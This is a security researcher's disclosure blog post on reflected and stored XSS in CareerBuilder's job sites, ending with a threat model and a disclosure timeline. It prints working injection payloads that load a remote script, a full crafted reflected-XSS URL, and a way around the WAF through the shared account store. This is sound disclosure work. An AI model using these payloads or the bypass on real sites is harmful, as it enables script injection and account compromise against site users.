=====================================================
Your WAF alone, is not enough, not enough, not enough
=====================================================

:date: 2016-05-27
:modified: 2016-06-06 17:40
:tags: XSS
:category: research
:slug: careerbuilder-xss
:authors: Ioannis Kakavas
:summary: Reflected and Stored XSS in multiple careerbuilder sites

TL;DR
+++++
A number of XSS vulnerabilities were identified in multiple sites owned by CareerBuilder



Introduction
++++++++++++

`Cross-site Scripting (XSS) <https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29>`_ is not new, not fancy, and sometimes frowned upon by security researchers as low hanging
fruits that are not worth the fuss that is made about them. I'm not exactly sure where I stand on the matter, but I do enjoy the occasional XSS hunt, especially if there is more to it than
entering the payload in a GET parameter and popping the alert box. This is one of a series of posts on XSS vulnerabilities that I have found in some sites that I consider worth sharing, either 
because of the target or some complexity/fun in exploiting them. 

CareerBuilder
+++++++++++++

CareerBuilder, according to them "has the largest online job site in the U.S., but we're more than just a job board. We are the global leader in human capital solutions. Through constant innovation, unparalleled technology, and customer care delivered at every touch point, CareerBuilder helps match the right talent with the right opportunity more often than any other site."
They have presence in more than 60 countries worldwide

 * www.careerbuilder.com (Alexa ranking : 462 in U.S., 1,741 worldwide)
 * www.careerbuilder.co.uk (Alexa ranking :  2.915 in UK)   
 * www.careerbuilder.es
 * www.careerbuilder.fr
 * www.careerbuilder.se (Alexa ranking : 943 in Sweden)
 * www.kariera.gr (Alexa ranking : 97 in Greece)

etc. 

Reflected XSS
-------------
I started my probing around from `the greek version <http://www.kariera.gr>`_ in their search field, using my favorite "xxxxx'yyyyy</img that I have long "stolen" from `Ashar <http://respectxss.blogspot.com>`_ and saw that none of the ", ', <, / were escaped as can be seen in the following screenshot

.. figure:: /images/kariera-1.png
   :alt: "xxxxx'yyyyy<img echoed back unescaped
      :width: 80 %
       
It can be seen that the first X and the I are capitalized ( this comes into play later on ). Ok, it looks like it can be exploited, what do we try next?

So, let's try to add an html tag and see if that goes through. I probe with <img> and get the following:

.. figure:: /images/kariera-2.png
    :alt: <img> echoed back escaped
       :width: 80 %

< and > are replaced by their unicode representation. The same happens with all tags that are closed. So no luck using payloads directly in the search parameter. 

Next I tried invoking JavaScript in the onerror of an <img> tag, as I thought it would not be necessary to close the tag, it would be closed by the next available '> character in the html. 
I entered *<img src="X" onerror="confirm(1);"* and waited for my confirm box to pop, but nothing. I could see the image placeholder in the page, 

.. figure:: /images/kariera-3.png
     :alt: img error attempt 1
     :width: 67 %


but no JavaScript was executed. Checking the source, I got the following:

.. figure:: /images/kariera-4.png
    :alt: img error attempt 2
    :width: 80 %

That should pop right? Wrong. JavaScript functions are of course case sensitive and **Confirm()** is not the same as **confirm()**. 

*Security by UX* as the web developer obviously thought that it would look nice if they capitalized the first letter of any given "word"..

But then, it hit me. I might not be able to inject <script> tags with inline Javasript code to be executed, both because of the capitalization of words and the fact that full tags are escaped, but if I can use an open *<img* tag, then I could use an open *<script* tag to load a malicious script from a remote server. CSP might cause a problem, but it didn't feel like they would have
bothered with using CSP in the first place. I took a look at the response headers and verified my thoughts

.. figure:: /images/kariera-response-headers.png
     :alt: kariera.gr response headers
     :width: 80 %

First attempt with this kind of payload was *<script src="http://XXX.XXX.XXX.XXX/testxss/mal.js"* where mal.js contained just an alert. Shockingly enough, I did not get anything from the browser. I took a look at my server logs to see if everything was ok and the culprit revealed itself : 

*[31/Mar/2016:17:56:25 +0300] "GET **/Testxss/Mal.Js** HTTP/1.1" 404 703 *

Sure enough the capitalization function had messed up the payload before reflecting it back to me, which caused a request to the wrong path. Quick solution was to host my JavaScript in a all capital path and name it MAL.JS so that the payload became : *<script src="http://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS"* (XSS RAGE!!!). Hit the search button and got an alert box 

.. figure:: /images/kariera-reflected-xss.png
     :alt: Reflected XSS
     :width: 80 %

Stored XSS
----------

So, if these controls are in place for the search input, what would be different for other user related input?

Nothing, as it turns out. 

I created a test user and soon enough identified that most of the user form data are vulnerable to the same payload that was used in the search form 

.. figure:: /images/kariera-registration-form.png
      :alt: Registration form
      :width: 50 %

So I set my first name as *Χρήστος<script src="http://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS"*, successfully submitted the form, and upon reload I was greeted by yet another alert box

.. figure:: /images/kariera-stored-xss.png
     :alt: kariera.gr stored  XSS
     :width: 50 %

The same payload was used on other input fields of the registration form but the vulnerability was prevalent in all parts of the web application. For example, I was able to upload a CV with the name *my_cv<script src="https://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS"*, and it would be happily consumed, resulting in the following anytime I accessed my CV page. 

.. figure:: /images/kariera-stored-xss-cv.png
     :alt: kariera.gr stored  XSS CV
     :width: 50 %

What's interesting, is why exactly this payload works. Let's take a look at the source code:

.. figure:: /images/kariera-stored-xss-source.png
     :alt: kariera.gr stored  XSS source
     :width: 50 %

Starting on line 131 we see our payload injected. The *</h3>* on line 132, and the closing *>* in particular closes our <script> which effectively becomes

.. code-block:: html
 
   <script src="https://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS" </h3>

The script is closed by the closing *</script>* tag in line 462 and everything in between is not rendered. 

Depending on the distance between where our payload is injected in the page and the next *</script>* closing tag, a lot oh HTML/JS can be disregarded, which might affect how the page is rendered in the victim's browser. On the other hand we can inject anything we want from our mal.js script so with a little more work we can make the page look as benign as the original.


Going Global
------------

Having identified these issues in the Greek version of the website, I thought that since all the careerbuilder network websites look pretty much similar, they are based
on the same implementation and thus vulnerable to the same attacks. Since, obviously, the impact of a stored XSS on careerbuilder.com is much bigger than one on kariera.gr, I pointed my browser to www.careerbuilder.com and used the same payload. Well, tough luck.. 

.. figure:: /images/kariera-waf.png
     :alt: careerbuilder.com WAF
     :width: 50 %

It looks like they are using some kind of Web Application Firewall that detects the XSS payload in the request and denies it. The same was true for all my attempts to create an account in careerbuilder.com injecting the payloads in the form fields or CV uploads as before. The same, unsuccessful, results in all the other national versions of the careerbuilder websites. All that I checked were protected by the same WAF. 

But, all the above versions of the website have something in common. The user account repository. In short, I could create an account in kariera.gr which is vulnerable, and then use these credentials to log in to www.careerbuilder.com, where I got the following

.. figure:: /images/careerbuilder-stored-xss.png
     :alt: kariera.gr stored  XSS
     :width: 50 %


Threat Model
------------

1. Unregistered_attacker: An attacker with no account on the website could create a crafted URL and trick a victim into requesting the URL, which would cause the user's browser to execute arbitrary JavaScript code. This would not work on Chrome, as the XSS protection kicks in and mitigates the reflected XSS attempt.

.. code-block:: html

   https://www.kariera.gr/intl/jobseeker/jobs/jrp.aspx?HdnIFlexSearchBox=1&_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AhihLanguage=GRGreek&IPath=QH&sc_cmp1=JS_GR_QSB_GEN&_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AMXJobSrchCriteria_Rawwords=%22%2F%3Esecurity+%3Cscript+src%3D%22https%3A%2F%2F1.1.1.1%2FTESTXSS%2FMAL.JS%22&_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AMXJobSrchCriteria_City1=%CE%91%CE%B8%CE%AE%CE%BD%CE%B1&sbmt=%CE%95%CF%8D%CF%81%CE%B5%CF%83%CE%B7+%CE%91%CE%B3%CE%B3%CE%B5%CE%BB%CE%B9%CF%8E%CE%BD&_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AMXJobSrchCriteria_States=

   
2. Registered_attacker: An attacker with an account on the website could edit their contact details in order to include arbitrary externally hosted JavaScript. Then,the browser of anyone seeing their profile, or their contact details if included in search results or other views would execute that. Potential victims include employers looking for candidates, site administrators, etc.

3. Registered_employer: An attacker with an employer account on the website could upload a job advert with arbitrary externally hosted JavaScript.Then,the browser of anyone seeing that advert, or if it was returned in a search result would execute that. Potential victims include candidates looking for jobs, site administrators, etc.


Disclosure Timeline
+++++++++++++++++++

 * 01/04/2016: Contacted TSST@careerbuilder.com looking for a contact where I could disclose my report.
 * 01/04/2016: Trust and Site Security Team replied that I could share the report with them.
 * 04/04/2016: Sent the detailed report to TSST including PoCs and screenshots.
 * 25/04/2016: Sent a reminder to TSST inquiring about the process.
 * 10/05/2016: Sent a reminder to TSST inquiring about the process.
 * 10/05/2016: TSST replied that they are looking into the matter.
 * 26/05/2016: Sent a reminder to TSST inquiring about the process.
 * 26/05/2016: TSST replied that the WAF has been deployed in all their national websites, thus they consider the issue solved.
 * 06/06/2016: Public Disclosure.  
